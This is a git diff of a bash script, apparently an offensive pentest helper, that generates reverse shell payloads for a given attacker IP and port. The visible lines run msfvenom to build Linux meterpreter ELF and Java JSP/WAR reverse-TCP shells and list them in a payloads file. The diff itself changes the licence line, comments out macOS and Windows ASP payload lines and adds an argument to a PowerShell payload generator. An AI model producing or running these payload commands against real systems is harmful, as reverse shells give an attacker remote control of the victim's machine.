@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Jan-Karel Visser
-# LGPLv3 licensed
+# AGPL-3.0-or-later licensed
 # https://jan-karel.nl
 # https://hacksec.nl
 
@@ -64,7 +64,7 @@ fi
 
 
 echo "[+] Take your time for some excessive handcrafted reverse shells with love and minimal care for ${IP} on port ${PORT}"
-curl "http://127.0.0.1/dashboard/zet_ip/${IP}"
+#curl "http://127.0.0.1/dashboard/zet_ip/${IP}"
 echo "[.] Now baking BASH reverse TCP shells..."
 echo '# Incompetent Bastard' > http/payloads/${BESTAND}_${PORT}.txt
 echo 'Excessive handcrafted reverse shells with love and minimal care.' >> http/payloads/${BESTAND}_${PORT}.txt
@@ -111,10 +111,10 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf >
 echo "meterpreter_${PORT}.elf :: linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meter64_${PORT}.elf
 echo "meter64_${PORT}.elf :: linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho > http/payloads/${BESTAND}_${PORT}.macho
-echo "${BESTAND}_${PORT}.macho :: osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > http/payloads/${BESTAND}_${PORT}.asp
-echo "${BESTAND}_${PORT}.asp :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp" >> http/payloads/${BESTAND}_${PORT}.txt
+#msfvenom -p osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho > http/payloads/${BESTAND}_${PORT}.macho
+#echo "${BESTAND}_${PORT}.macho :: osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho" >> http/payloads/${BESTAND}_${PORT}.txt
+#msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > http/payloads/${BESTAND}_${PORT}.asp
+#echo "${BESTAND}_${PORT}.asp :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.jsp
 echo "${BESTAND}_${PORT}.jsp :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/payloads/${BESTAND}_${PORT}.war
@@ -147,7 +147,7 @@ echo '# POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
 
 
-python3 powershell.py ${IP} ${PORT} windows/x64/meterpreter/reverse_tcp http/payloads/${BESTAND}_${PORT}.txt
+python3 powershell.py ${IP} ${PORT} hatseflatsj windows/x64/meterpreter/reverse_tcp http/payloads/${BESTAND}_${PORT}.txt
 
 
 
